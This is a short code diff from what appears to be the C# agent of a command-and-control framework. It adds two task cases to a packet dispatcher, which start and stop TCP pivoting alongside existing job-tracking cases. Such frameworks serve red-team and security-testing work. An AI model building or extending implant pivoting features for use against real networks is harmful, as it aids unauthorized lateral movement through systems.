@@ -523,6 +523,10 @@ AESc = AES encrypted using the client's session key
                         jobTracking.StartAgentJob(packet.data, packet.taskId);
                         jobTracking.jobs[taskId.ToString()].Status = "running";
                         return EncodePacket(packet.type, "Job started: " + taskId.ToString(), packet.taskId);
+                    case 72:
+                        return StartTcpPivot(packet);
+                    case 73:
+                        return StopTcpPivot(packet);
                     case 120:
                         jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return Task120(packet);
